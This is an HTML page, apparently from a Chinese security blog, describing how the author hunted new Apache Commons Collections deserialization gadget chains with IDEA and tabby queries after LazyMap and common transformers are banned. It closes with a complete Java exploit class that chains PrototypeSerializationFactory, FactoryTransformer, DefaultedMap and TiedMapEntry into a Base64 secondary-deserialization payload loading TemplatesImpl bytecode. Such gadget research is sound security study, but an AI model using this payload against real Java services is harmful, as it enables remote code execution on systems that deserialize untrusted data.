@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            CC链再挖掘 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        CC链再挖掘
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-10-27 19:32:01</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Oct 27 2025 19:34:54 GMT+0800">2025-10-27 19:34:54</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看了网上对CC依赖的再分析，想试着自己挖一下链子。</p>
+<p>这里使用idea和tabby两种工具进行挖掘。</p>
+<p>现在的假设情况是，常见的transform类全部禁用，LazyMap也被禁用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761564336877-60b0e616-b5e5-4268-9ee7-7ad5b624fbc9.png"  alt="img"></p>
+<p>明确目标：</p>
+<p>先找一个能够调用transform的方法(平替LazyMap)。然后再找一个新的transform()，能够直接或间接调用newInstance实例化任意类，从而触发TrAXFilter，最终实现TemplatesImpl加载字节码。</p>
+<h1 id="transform"><a href="#transform" class="headerlink" title="?-&gt;transform"></a>?-&gt;transform</h1><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>最经典的触发方法。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761552202651-4dbf7d4e-8ac0-46b5-85f0-220ce7745da1.png"  alt="img"></p>
+<h2 id="DefaultedMap"><a href="#DefaultedMap" class="headerlink" title="DefaultedMap"></a>DefaultedMap</h2><h3 id="idea挖掘"><a href="#idea挖掘" class="headerlink" title="idea挖掘"></a>idea挖掘</h3><p>跟LazyMap一样，也是get触发：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761552421820-91af52ba-249c-4f79-b2d9-efdbfc3c3cf2.png"  alt="img"></p>
+<p>直接对着transform alt+f7就能找到：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761552748612-f11c8759-91cf-49c2-95e3-ebf49df4c635.png"  alt="img"></p>
+<h3 id="tabby挖掘"><a href="#tabby挖掘" class="headerlink" title="tabby挖掘"></a>tabby挖掘</h3><p>或者用tabby</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> (source:<span class="keyword">Method</span>&#123;IS_SERIALIZABLE:<span class="literal">TRUE</span>&#125;)</span><br><span class="line"><span class="keyword">match</span> (sink:<span class="keyword">Method</span>&#123;NAME0:&quot;org.apache.commons.collections.Transformer#transform&quot;&#125;)</span><br><span class="line"><span class="keyword">CALL</span> apoc.algo.allSimplePaths(source, sink, &quot;CALL&gt;|ALIAS&gt;&quot;, <span class="number">1</span>) yield path</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NONE</span>(</span><br><span class="line">  n <span class="keyword">IN</span> nodes(path) </span><br><span class="line">  <span class="keyword">WHERE</span> n.CLASSNAME <span class="keyword">IN</span> [</span><br><span class="line">    &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span><br><span class="line">  ]</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> path</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761553224073-b777c8c6-09fc-43fc-a83b-d6c60b9a8300.png"  alt="img"></p>
+<p>剩下的几个都不满足要求，我们需要的是常见的方法，比如get。稍微看几个。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761562234708-8d7d087a-a1fe-437a-a73d-6b6e39f1a195.png"  alt="img"></p>
+<p>这里用transform调transform，LazyMap被ban的情况下可以用。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761562489224-772da43f-836e-4d2a-b447-0eb6cd1e8f98.png"  alt="img"></p>
+<p>跟上面一样，也是调transform</p>
+<h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>新找到的，能够通过compare触发，可惜不能反序列化，所以没用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761552281563-9838e833-eea2-4233-808e-3a4d183dbeca.png"  alt="img"></p>
+<h1 id="transform-newInstance"><a href="#transform-newInstance" class="headerlink" title="transform-&gt;newInstance"></a>transform-&gt;newInstance</h1><p>这里挖掘transform-&gt;newInstance</p>
+<h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p>这是最经典的，就是CC链官方的。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761557273260-50e86318-bf15-4b19-839b-1b50b6edab48.png"  alt="img"></p>
+<h2 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h2><h3 id="tabby挖掘-1"><a href="#tabby挖掘-1" class="headerlink" title="tabby挖掘"></a>tabby挖掘</h3><p>通过tabby挖掘：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> (source:<span class="keyword">Method</span>&#123;IS_SERIALIZABLE:<span class="literal">TRUE</span>,NAME:&quot;transform&quot;&#125;)</span><br><span class="line"><span class="keyword">match</span> (sink:<span class="keyword">Method</span>&#123;NAME:&quot;newInstance&quot;,IS_SINK:<span class="literal">TRUE</span>&#125;)</span><br><span class="line"><span class="keyword">call</span> tabby.beta.findPath(source, &quot;&gt;&quot;, sink, <span class="number">4</span>, <span class="literal">false</span>) yield path</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NONE</span>(</span><br><span class="line">  n <span class="keyword">IN</span> nodes(path) </span><br><span class="line">  <span class="keyword">WHERE</span> n.CLASSNAME <span class="keyword">IN</span> [</span><br><span class="line">    &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span><br><span class="line">  ] <span class="keyword">or</span> n.CLASSNAME <span class="operator">=</span><span class="operator">~</span> &quot;org.apache.commons.collections4.*&quot;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> path</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761557395407-1c1377b2-10da-48d2-a45c-d9574b758c41.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761557426130-c3cdd7bb-222a-41da-a391-e71b8077b5bd.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761557481518-7fb2030e-6c93-4716-90f2-238b1d0a98f3.png"  alt="img"></p>
+<p>其实跟InstantiateTransformer差不多。</p>
+<p>当然，用apoc插件查询也可以：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> (source:<span class="keyword">Method</span>&#123;NAME:&quot;transform&quot;,IS_SERIALIZABLE:<span class="literal">TRUE</span>&#125;)</span><br><span class="line"><span class="keyword">match</span> (sink:<span class="keyword">Method</span>&#123;NAME0:&quot;java.lang.reflect.Constructor#newInstance&quot;&#125;)</span><br><span class="line"><span class="keyword">CALL</span> apoc.algo.allSimplePaths(source, sink, &quot;CALL&gt;|ALIAS&gt;&quot;, <span class="number">4</span>) yield path</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NONE</span>(</span><br><span class="line">  n <span class="keyword">IN</span> nodes(path) </span><br><span class="line">  <span class="keyword">WHERE</span> n.CLASSNAME <span class="keyword">IN</span> [</span><br><span class="line">    &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,</span><br><span class="line">    &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span><br><span class="line">  ] <span class="keyword">or</span> n.CLASSNAME <span class="operator">=</span><span class="operator">~</span> &quot;org.apache.commons.collections4.*&quot;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> path</span><br></pre></td></tr></table></figure>
+
+<h3 id="idea挖掘-1"><a href="#idea挖掘-1" class="headerlink" title="idea挖掘"></a>idea挖掘</h3><p>对着transform方法，alt+f7 在项目和库作用域中查找<strong>实现</strong>：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761559549349-58680208-1a93-4b31-be83-55091bc296f4.png"  alt="img"></p>
+<p>左边的方法一个个看过去，就能找到FactoryTransformer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761559638986-9ed35eb1-ca60-42d7-af0f-88bd2ba7cf03.png"  alt="img"></p>
+<p>然后对着这个create方法，alt+f7查询<strong>实现</strong>：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761559677880-e4dcafb2-0d38-4c57-b2a1-b98d448d72ba.png"  alt="img"></p>
+<p>这样也能找到。像这种方法比较少的情况，可以先全部看一遍，然后挑简单的先分析。</p>
+<h2 id="CloneTransformer"><a href="#CloneTransformer" class="headerlink" title="CloneTransformer"></a>CloneTransformer</h2><p>上面的tabby还查询到了这个类，说它的transform也能到newInstance。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558047694-797cb224-b15e-4a6c-8f11-cb5804a2b9f4.png"  alt="img"></p>
+<p>这里我们跟进一下org.apache.commons.collections.map.MultiValueMap.ReflectionFactory#create<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558072967-5541b688-1787-426c-8432-553a1d11b4e7.png"  alt="img"></p>
+<p>这里只能调用无参构造，可利用性比较差。</p>
+<p>而且前面的transform方法里，也不能直接指定类，而是通过PrototypeFactory.getInstance(input)：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558162741-3d558f7c-530d-4f0c-9f02-90ddf56d57e9.png"  alt="img"></p>
+<p>这个getInstance里面也是有限制的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558407119-51ff07d6-b800-495e-9ac1-4ae6d6c6891f.png"  alt="img"></p>
+<p>try要求我们实例化的类里必须有clone方法。catch里返回的类也无法指定。所以，这里只能调用红框里的三个类的create方法，而无法调用我们一开始想的ReflectionFactory#create</p>
+<h1 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h1><p>寻找链子的过程中，意外发现了一个二次反序列化入口。</p>
+<p>上面的CloneTransformer，只能调用指定三个类的create方法。当时就一个个跟进看了一下。</p>
+<p>PrototypeCloneFactory：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558798841-4950043e-b610-4bd3-86ff-a444bb87901b.png"  alt="img"></p>
+<p>只能调用无参方法，比较鸡肋。</p>
+<p>InstantiateFactory：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558888462-6c35a570-8811-44db-89fe-54741b39fab1.png"  alt="img"></p>
+<p>就是上面新发现的transform-&gt;newInstance的中间类</p>
+<p>PrototypeSerializationFactory：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761558954287-e58c02c0-e781-497e-bbed-986d91386137.png"  alt="img"></p>
+<p>这不是一个二次反序列化吗？</p>
+<p>这个create，其实在用idea挖掘FactoryTransformer那条链时，就有看到:</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761559796958-102f3252-6d64-4444-9cf4-566b8b301737.png"  alt="img"></p>
+<p>create可以通过FactoryTransformer#transform直接调用，exp：</p>
+<p>这里用fastjson来触发getter了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Factory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"><span class="keyword">import</span> tools.TemplatesGen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserTwice</span> <span class="keyword">extends</span> <span class="title class_">Payload</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DeserTwice</span> <span class="variable">deserTwice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeserTwice</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> deserTwice.getPayload(<span class="literal">null</span>, <span class="string">&quot;CalcAbs.class&quot;</span>);</span><br><span class="line">        ReflectTools.deser(<span class="literal">null</span>, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPayload</span><span class="params">(<span class="type">byte</span>[] byteCode, String bytePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesGen.getTemplates(byteCode, bytePath);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        ReflectTools.setFieldValue(bad, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Serializable.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Factory</span> <span class="variable">o</span> <span class="operator">=</span> (Factory) declaredConstructor.newInstance(bad);</span><br><span class="line"></span><br><span class="line">        <span class="type">FactoryTransformer</span> <span class="variable">factoryTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FactoryTransformer</span>(o);</span><br><span class="line"></span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultedMap</span>(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        ReflectTools.setFieldValue(defaultedMap, <span class="string">&quot;value&quot;</span>, factoryTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(defaultedMap, <span class="string">&quot;111a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        ReflectTools.setFieldValue(bad2, <span class="string">&quot;val&quot;</span>, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = ReflectTools.ser2bytes(bad2);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>值得一提的是，这个二次反序列化，tabby是找不到的。因为触发二次反序列化的create，是无参方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761563876460-ddf64718-b476-4681-b9a3-fa582493bb99.png"  alt="img"></p>
+<p>根本没有参数去进行污点传播，tabby自然就找不到。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>挖掘利用链时，要先搞清楚我们要找一个什么样的方法。在这里，我们要找一个能够直接或间接执行newInstance的transform。这决定了我们怎么去写tabby语法。同时要注意，有些无参构造和无参方法的利用，tabby是找不到的。</p>
+<p>在利用idea查找时，要灵活使用alt+f7，并按需勾选用法&#x2F;实现：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761564173773-6651ac1c-206b-464c-81d7-93c14ddca2e2.png"  alt="img"></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                CC链再挖掘
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/10/27/CC链再挖掘/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
